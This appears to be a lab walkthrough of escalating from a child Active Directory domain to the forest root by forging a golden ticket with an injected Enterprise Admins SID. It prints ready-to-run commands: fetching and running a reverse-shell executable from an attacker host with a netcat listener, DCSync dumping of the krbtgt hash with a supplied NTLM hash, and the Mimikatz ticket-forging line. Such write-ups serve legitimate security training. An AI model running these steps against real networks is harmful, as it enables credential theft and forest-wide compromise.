# Child-to-Parent Domain Privilege Escalation (SID History Injection)
**Phase:** Forest Enumeration, Krbtgt Compromise & Cross-Domain Golden Ticket Injection

## 1. Local Situational Awareness & Foothold Staging

After leveraging Pass-the-Hash onto the Child Domain Controller (`192.168.98.120`), establish an interactive reverse session and verify permissions.

### 1.1 Staging Payload via PowerShell
```powershell
# Currently loged in as corpmngr user as we did in previous parts 
# Navigate user directories on 192.168.98.120
cd C:\Users
ls
# it was found no home directory for corpmngr user
# new user corphead found in the list
# Drop payload into write-accessible profile directory
cd C:\Users\corphead\Downloads
Invoke-WebRequest -Uri "http://10.10.200.2:8000/rev.exe" -OutFile "C:\Users\corphead\Downloads\rev.exe"
.\rev.exe

```

### 1.2 Catching the Reverse Connection (Attacker Listener)

```bash
# Setup netcat listener on Kali / Attacker box
nc -lnvp 9990

```

### 1.3 Privilege & Domain Validation

```powershell
# Enumerate local administrative privileges
net localgroup Administrators

# List domain accounts registered in the child domain
net user /dom
# Output ---> Guest, Administrator, john, krbtgt, corphead, corpmngr
```

---

## 2. Active Directory Trust & Forest Enumeration

Because Active Directory domains within the same forest share a two-way transitive Kerberos trust by default, compromising a child domain provides a direct attack path to the forest root (parent domain).

### 2.1 Load Enumeration Scripts

```powershell
Invoke-WebRequest -Uri "http://10.10.200.2:8000/PowerView.ps1" -OutFile "C:\Users\corphead\Downloads\pv.ps1"
Import-Module .\pv.ps1

```

### 2.2 Trust & Forest Reconnaissance

```powershell
# Using the Active Directory module (if RSAT is present)
Get-ADTrust -Filter *


(Get-ADForest).Domains

# Using PowerView (no RSAT dependencies)
Get-DomainTrust
Get-NetForestDomain

```


``` powershell
    Get-NetForestDomain

    #output :
    Forest: warfare.corp
    DomainControllers:{cdc.child.warfare.corp}
    Children:{}
    Parent:{warfare.corp}
    Name:child.warfare.corp

    Forest: warfare.corp
    DomainControllers:{dc01.warfare.corp}
    Children:{child.warfare.corp}
    Parent:{warfare.corp}
    Name:warfare.corp
    
    (Get-NetForestDomain).DomainControllers
    # output-> child.warfare.corp & warfare.corp
```



### Target Infrastructure Mapping

* **Forest Root Domain:** `warfare.corp` (DC: `dc01.warfare.corp`)
* **Child Domain:** `child.warfare.corp` (DC: `cdc.child.warfare.corp` / `192.168.98.120`)
* **Trust Type:** Bidirectional, Transitive intra-forest trust.

---

## 3. Extracting Child Domain Secrets (`krbtgt`)

• Now we will try to dump krbtgt hash from child.warfare.corp and it will be possible bcz corpmngr is a local admin here.

• To forge a Ticket Granting Ticket (TGT) for the child domain, we require the NTLM hash or AES-256 key of the child domain's `krbtgt` account.

### 3.1 Remote Hash Dumping via DCSync (`secretsdump.py`)

Because DCSync requests directory replication over MS-DRSR, run it from the attacker machine through the established SOCKS pivot:

```bash
proxychains secretsdump.py 'child.warfare.corp/corpmngr@192.168.98.120' -hashes :4cb3933610b827a281ec479031128cc6 -just-dc-user krbtgt

```

> **Note on Mimikatz DCSync via Local SYSTEM Shell:** If operating as `NT AUTHORITY\SYSTEM`, `lsadump::dcsync` may fail because machine accounts do not possess the required Active Directory replication rights (`DS-Replication-Get-Changes-All`). Use the domain credentials (`corpmngr`) with Impacket's `secretsdump.py` or impersonate a privileged domain user token.

---

## 4. Domain Identifier (SID) Enumeration

A cross-domain Golden Ticket requires the Security Identifiers (SIDs) of both the target domains to calculate security tokens correctly:

1. **Child Domain SID:** Used to define the ticket issuing authority.
2. **Parent Domain SID:** Appended with `RID 519` (`Enterprise Admins`) inside the `sids` attribute (SID History).

```powershell
# Retrieve Child Domain SID
Get-DomainSID -Domain child.warfare.corp
# Example: S-1-5-21-2236830845-367447699-1251797681

# Retrieve Parent Domain SID
Get-DomainSID -Domain warfare.corp
# Example: S-1-5-21-3912048572-2491029482-1928472910

```

---

## 5. SID History Injection Attack Mechanics

### Requirements to move from child ---> parent DC

    admin priv on child

    need the krbtgt hash

    SID of the both machines (child and parent)

    SID history injection will be done 



### Why SID History Injection Works Across Trusts

* The Active Directory `SIDHistory` attribute exists to maintain access to resources when accounts migrate from one domain to another.
* When a user presents a TGT, the Key Distribution Center (KDC) populates the PAC (Privilege Attribute Certificate) with the user's primary group memberships alongside all SIDs listed in their `sIDHistory`.
* By default, intra-forest trusts **do not enable SID filtering**.
* If an attacker generates a ticket inside `child.warfare.corp` and injects the parent domain's **Enterprise Admins** SID (`<Parent-Domain-SID>-519`) into the SID History field, the root Domain Controller accepts the ticket and grants forest-wide administrative privileges.

---

## 6. Ticket Forgery & Escalation Execution

### 6.1 Baseline Verification

Before injection, verify that the parent DC rejects unauthorized administrative requests:

```powershell
dir \\dc01.warfare.corp\C$
# [-] Access is denied.

```

### 6.2 Forging Cross-Domain Golden Ticket with Mimikatz

Drop into an interactive `cmd` prompt to run Mimikatz:

```cmd
mimi.exe

```

Generate the ticket and inject it into the current logon session memory (`/ptt`):

```cmd
kerberos::golden /user:Administrator /domain:child.warfare.corp /sid:<child_domain_sid_here> /sids:<parent_domain_sid_here> /aes256:<krbtgt_aes256_key> /startoffset:-5 /endin:600 /renew:10080 /ptt

```

*(Alternatively, supply `/krbtgt:<ntlm_hash>` instead of `/aes256` if using the NTLM hash).*

### 6.3 Target Verification

Validate that the forged Kerberos ticket is loaded in memory and test administrative access across the forest root:

```powershell
# Review loaded Kerberos tickets
klist

# Access the Root DC's C$ administrative share
dir \\dc01.warfare.corp\C$
# [+] Directory listing successful!

```

---

## 7. Forest Root Compromise Summary

* **Current Foothold:** Child Domain Controller (`cdc.child.warfare.corp`).
* **Compromise Technique:** Kerberos TGT Forgery with Enterprise Admins SID History injection (`RID 519`).
* **Resulting Vantage:** Unrestricted administrative access across the entire Active Directory Forest Root (`warfare.corp`).

